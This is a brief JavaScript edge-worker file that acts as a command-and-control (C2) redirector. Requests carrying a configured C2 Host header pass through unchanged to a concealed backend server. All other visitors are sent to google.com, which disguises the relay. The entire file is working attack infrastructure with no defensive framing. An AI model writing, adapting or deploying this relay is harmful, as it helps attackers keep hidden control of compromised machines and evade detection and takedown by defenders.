// cloud-relay/worker.js
export default {
  async fetch(request, env) {
    const hostHeader = request.headers.get("Host");
    if (hostHeader === env.C2_HOST) {
      const url = new URL(request.url);
      const backendUrl = env.BACKEND_URL + url.pathname + url.search;
      const modifiedRequest = new Request(backendUrl, {
        method: request.method,
        headers: request.headers,
        body: request.body,
      });
      try {
        const response = await fetch(modifiedRequest);
        return response;
      } catch {
        return new Response("Backend C2 Unavailable", { status: 503 });
      }
    } else {
      return new Response(null, { status: 302, headers: { 'Location': 'https://www.google.com' } });
    }
  }
};